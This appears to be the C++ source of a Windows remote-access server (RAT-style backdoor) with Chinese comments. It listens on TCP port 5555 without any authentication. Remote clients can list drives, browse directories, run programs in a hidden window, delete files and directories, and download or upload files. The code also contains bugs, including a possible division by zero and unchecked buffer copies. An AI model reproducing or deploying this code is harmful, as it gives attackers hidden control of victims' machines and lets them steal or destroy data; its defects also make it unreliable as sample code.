#include <afx.h>
#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#include <afxcmn.h>			// MFC support for Windows Common Controls
#include <windows.h>
#include <winsock.h>
#include<iostream>

using namespace std;

#pragma comment (lib,"ws2_32")						//加载库函数
#pragma comment (lib,"msvcrt")

#define GetDriver	0x01
#define GetDirInfo	0x02
#define ExecFile	0x03
#define GetFile		0x04
#define PutFile		0x05
#define DelFile		0x06
#define DelDir		0x07
#define CreateDir	0x08
#define FileInfo	0x09
#define GetScreen	0x10

#define  BUF_LEN	1024
#define CHUNK_SIZE (64*1024)


 

typedef struct					//命令结构
{
	int			ID;				//命令ID
	BYTE		lparam[BUF_LEN*2]; 

}COMMAND;



typedef struct					//文件结构
{
	char		FileName[MAX_PATH];
	int			FileLen;
	char		Time[50];
	BOOL		IsDir;
	BOOL		Error;
	HICON		hIcon;			//图标句柄

}FILEINFO;

BOOL DeleteDirectory(char *DirName);

DWORD	WINAPI SLisen	(LPVOID lparam);
DWORD	GetDriverProc	(COMMAND command,SOCKET client);
DWORD	GetDirInfoProc	(COMMAND command,SOCKET client);
DWORD	ExecFileProc	(COMMAND command,SOCKET client);
DWORD	DelFileProc		(COMMAND command,SOCKET client);
DWORD	FileInfoProc	(COMMAND command,SOCKET client);
DWORD   CreateDirProc	(COMMAND command,SOCKET client);
DWORD   DelDirProc		(COMMAND command,SOCKET client);
DWORD   GetFileProc		(COMMAND command,SOCKET client);
DWORD   PutFileProc		(COMMAND command,SOCKET client);


int main()
{

	WSADATA wsadata;
	SOCKET server;
	SOCKET client;
	SOCKADDR_IN serveraddr;
	SOCKADDR_IN clientaddr;
	int port=5555;
	WORD ver=MAKEWORD(2,2);							//判断winsock版本
	if(WSAStartup(ver,&wsadata)!=0)
	{
		printf("套接字初始化失败");
		return 0;
	}//初始SOCKET


	if((server=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0)
	{
		printf("套接字创建失败");
		WSACleanup();
		return 0;
	}

	serveraddr.sin_family=AF_INET;
	serveraddr.sin_port=htons(port);
	serveraddr.sin_addr.S_un.S_addr=htonl(INADDR_ANY);
	

	if(bind(server,(SOCKADDR*)&serveraddr,sizeof(serveraddr))!=0)
	{
		printf("套接字绑定失败");
		return 0;
	}
	
	if(listen(server,5)!=0)
	{
		printf("监听失败");
		return 0;
	}

	int len=sizeof(clientaddr);
	

	while(true)
	{
		if(client=accept(server,(sockaddr *)&clientaddr,&len))
		{
			printf("线程已建立! \n");
			CreateThread(NULL,NULL,SLisen,(LPVOID)client,NULL,NULL);
		}
	}

	closesocket(server);
	closesocket(client);
	WSACleanup();
	return 0;
}


DWORD WINAPI SLisen(LPVOID lparam)
{
	SOCKET client=(SOCKET)lparam;
	
	COMMAND command;

	while(1)
	{
		memset((char*)&command,0,sizeof(command));
		if(recv(client,(char*)&command,sizeof(command),0)==SOCKET_ERROR)
		{
			cout<<"The Clinet Socket is Closed\n";
			break;
		}else
		{
			
			switch(command.ID)
				{
				case GetDriver:
					 GetDriverProc	(command,client);
					 break;
				case GetDirInfo:
					 GetDirInfoProc	(command,client);
					 break;
				case ExecFile:
					 ExecFileProc	(command,client);
					 break;
				case DelFile:
					 DelFileProc	(command,client);
					 break;
				case FileInfo:
					 FileInfoProc	(command,client);
					 break;
				case CreateDir:
					 CreateDirProc	(command,client);
					 break;
				case DelDir:
					 DelDirProc		(command,client);
					 break;
				case GetFile:
					 GetFileProc	(command,client);
					 break;
				case PutFile:
					 PutFileProc	(command,client);
					 break;

				}
		}
	}

	closesocket(client);
	return 0;
}


DWORD	GetDriverProc(COMMAND command,SOCKET client)
{
	cout<<"GetDriver is ok\n";

	COMMAND cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=GetDriver;

	for(char i='A';i<='Z';i++)
	{
		char x[20]={i,':'};

		UINT Type=GetDriveType(x);

		if(Type==DRIVE_FIXED||Type==DRIVE_REMOVABLE||Type==DRIVE_CDROM)

		{
			cout<<x<<"\n";
			memset((char*)&cmd.lparam,0,sizeof(cmd.lparam));
			strcpy((char*)&cmd.lparam,x);
			if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR)
			{
				cout << "Send Driver is Error\n";
			}
		}
	}
	return 0;
}


DWORD	GetDirInfoProc(COMMAND command,SOCKET client)
{
	cout<<"GetDir is ok\n";

	FILEINFO fi;
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	memset((char*)&fi,0,sizeof(fi));

	strcat((char*)command.lparam,"*.*");
	cout<<(char*)command.lparam<<"\n";

	CFileFind file;
	BOOL bContinue = file.FindFile((char*)command.lparam);

	while(bContinue)
	{
		memset((char*)&cmd,0,sizeof(cmd));
		memset((char*)&fi,0,sizeof(fi));

		bContinue = file.FindNextFile();
		if(file.IsDirectory())
		{
			fi.IsDir=true;
		}
		strcpy(fi.FileName,file.GetFileName().LockBuffer());
		cout<<fi.FileName<<"\n";

		cmd.ID=GetDirInfo;
		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

		if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR)
		{
			cout << "Send Dir is Error\n";
		}
	}

	return 0;
}


DWORD ExecFileProc (COMMAND command,SOCKET client)
{
	cout<<"ExecFile is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=ExecFile;

	if(ShellExecute(NULL,"open",(char*)command.lparam,NULL,NULL,SW_HIDE)<(HINSTANCE)32)
	{
		strcpy((char*)cmd.lparam,"文件执行失败!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	else
	{
		strcpy((char*)cmd.lparam,"文件执行成功!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}

	return 0;
}


DWORD DelFileProc (COMMAND command,SOCKET client)
{
	cout<<"DelFile is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=DelFile;

	SetFileAttributes((char*)command.lparam,FILE_ATTRIBUTE_NORMAL); //去掉文件的系统和隐藏属性
	
	
	if(DeleteFile((char*)command.lparam)==0)
	{
		strcpy((char*)cmd.lparam,"文件删除失败!");
		send(client,(char*)&cmd,sizeof(cmd),0);

	}
	else
	{
		strcpy((char*)cmd.lparam,"文件删除成功!");
		send(client,(char*)&cmd,sizeof(cmd),0);

	}

	return 0;

}


DWORD	FileInfoProc	(COMMAND command,SOCKET client)
{
	cout<<"get fileinfo is ok\n";

	COMMAND	 cmd;
	FILEINFO fi;

	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));

	HANDLE hFile;

	WIN32_FIND_DATA WFD;

	memset((char*)&WFD,0,sizeof(WFD));


	if((hFile=FindFirstFile((char*)command.lparam,&WFD))==INVALID_HANDLE_VALUE)	//查看文件属性
	{
		fi.Error=true;
		return 0;
	}

	DWORD		FileLen;
	char		stime[32];
	SHFILEINFO	shfi;
	SYSTEMTIME	systime;
	FILETIME	localtime;

	memset(&shfi,0,sizeof(shfi));

	//得到文件的相关信息
	SHGetFileInfo(WFD.cFileName, 
					FILE_ATTRIBUTE_NORMAL,
					&shfi, sizeof(shfi),
					SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );


	//写入文件信息结构
	strcpy(fi.FileName,(char*)command.lparam);					//文件路径

	FileLen=(WFD.nFileSizeHigh*MAXDWORD+WFD.nFileSizeLow)/1024; //文件长度

	fi.FileLen=FileLen;

	//转化格林时间到本地时间
	FileTimeToLocalFileTime(&WFD.ftLastWriteTime,&localtime);
	FileTimeToSystemTime(&localtime,&systime);

	sprintf(stime,"%4d-%02d-%02d %02d:%02d:%02d",
			systime.wYear,systime.wMonth,systime.wDay,systime.wHour,
			systime.wMinute,systime.wSecond);

	strcpy(fi.Time,stime);									//文件时间


	//暂时用来存放文件属性
	if(GetFileAttributes((char*)command.lparam)&FILE_ATTRIBUTE_HIDDEN)
	{
		fi.IsDir=true;	//隐藏文件
		cout<<"this file is hide\n";
	}else
	if(GetFileAttributes((char*)command.lparam)&FILE_ATTRIBUTE_READONLY)
	{
		cout<<"this is file is read\n";
		fi.Error=true;	//只读文件
	}

	cmd.ID=FileInfo;

	memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

	send(client,(char*)&cmd,sizeof(cmd),0);

	FindClose(hFile);

	return 0;
}


DWORD   CreateDirProc	(COMMAND command,SOCKET client)
{
	cout <<"create dir id is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=CreateDir;

	if(::CreateDirectory((char*)command.lparam,NULL))
	{
		strcpy((char*)cmd.lparam,"创建目录成功!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	else
	{
		strcpy((char*)cmd.lparam,"创建目录失败!可能有重名文件或文件夹");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	
	return 0;
}

DWORD DelDirProc (COMMAND command,SOCKET client)
{
	cout <<"del dir id is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=DelDir;

	cout<<(char*)command.lparam<<"\n";

	if(DeleteDirectory((char*)command.lparam)==TRUE)
	{
		strcpy((char*)cmd.lparam,"删除目录成功!");
		send(client,(char*)&cmd,sizeof(cmd),0);

	}
	else
	{
		strcpy((char*)cmd.lparam,"删除目录失败!可能有文件正在运行");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}

	return 0;

}



BOOL DeleteDirectory(char *DirName)
{
	cout<<"DeleteDir is ok\n";
   CFileFind tempFind;
   char tempFileFind[200];
   sprintf(tempFileFind,"%s*.*",DirName);
   BOOL IsFinded=(BOOL)tempFind.FindFile(tempFileFind);
   while(IsFinded)
   {
      IsFinded=(BOOL)tempFind.FindNextFile();
      if(!tempFind.IsDots())
      {
         char foundFileName[200];
         strcpy(foundFileName,tempFind.GetFileName().GetBuffer(200));
         if(tempFind.IsDirectory())
         {
            char tempDir[200];
            sprintf(tempDir,"%s\\%s",DirName,foundFileName);
            DeleteDirectory(tempDir);
         }
         else
         {
            char tempFileName[200];
            sprintf(tempFileName,"%s\\%s",DirName,foundFileName);
			SetFileAttributes(tempFileName,FILE_ATTRIBUTE_NORMAL); //去掉文件的系统和隐藏属性
            DeleteFile(tempFileName);
			cout <<"now delete "<<tempFileName<<"\n";
         }
      }
   }
   tempFind.Close();
   if(!RemoveDirectory(DirName))
   {
      return FALSE;
   }
   return TRUE;
}







DWORD  GetFileProc	(COMMAND command,SOCKET client)
{
	cout <<"get file proc is ok\n";

	COMMAND	 cmd;
	FILEINFO fi;
	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=GetFile;

	CFile	file;
	int		nChunkCount=0;	//文件块数

	if(file.Open((char*)command.lparam,CFile::modeRead|CFile::typeBinary))
	{
		cout <<(char*)command.lparam<<"\n";

		int FileLen=file.GetLength();

		fi.FileLen=file.GetLength();

		strcpy((char*)fi.FileName,file.GetFileName());

		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

		send(client,(char*)&cmd,sizeof(cmd),0);

		nChunkCount=FileLen/CHUNK_SIZE;
		
		if(FileLen%nChunkCount!=0)
			nChunkCount++;

		char *date=new char[CHUNK_SIZE];
		
		for(int i=0;i<nChunkCount;i++)						//分块发送
		{
			cout<<"send the count"<<i<<"\n";
			int nLeft;

			if(i+1==nChunkCount)							//最后一块
				nLeft=FileLen-CHUNK_SIZE*(nChunkCount-1);
			else
				nLeft=CHUNK_SIZE;

			int idx=0;
			file.Read(date,CHUNK_SIZE);

			while(nLeft>0)
			{
				int ret=send(client,&date[idx],nLeft,0);
				if(ret==SOCKET_ERROR)
					cout<<"error \n";

				nLeft-=ret;
				idx+=ret;
			}
		}

		file.Close();
		delete[] date;

	}

	return 0;
}


DWORD  PutFileProc	(COMMAND command,SOCKET client)
{
	cout<<"PutFile is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=PutFile;

	FILEINFO *fi=(FILEINFO*)command.lparam;
	int		FileLen=fi->FileLen;
	CFile	file;
	int		nChunkCount=FileLen/CHUNK_SIZE;

	if(FileLen%nChunkCount!=0)
	{
		nChunkCount++;
	}

	if(file.Open(fi->FileName,CFile::modeWrite|CFile::typeBinary|CFile::modeCreate))
	{
			char *date = new char[CHUNK_SIZE];

			for(int i=0;i<nChunkCount;i++)
			{
				int nLeft;

				if(i+1==nChunkCount)						//最后一块
					nLeft=FileLen-CHUNK_SIZE*(nChunkCount-1);
				else
					nLeft=CHUNK_SIZE;

				int idx=0;

				while(nLeft>0)
				{
					int ret=recv(client,&date[idx],nLeft,0);

					if(ret==SOCKET_ERROR)
					{
						printf("recv file error\n");
						break;
					}
					idx+=ret;
					nLeft-=ret;
				}
				file.Write(date,CHUNK_SIZE);
			}
			file.Close();
			delete[] date;
			printf("文件传输完成\n");

			strcpy((char*)cmd.lparam,"文件上传成功!");
			send(client,(char*)&cmd,sizeof(cmd),0);
	}else
	{
		strcpy((char*)cmd.lparam,"文件上传失败!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}









	return 0;
}













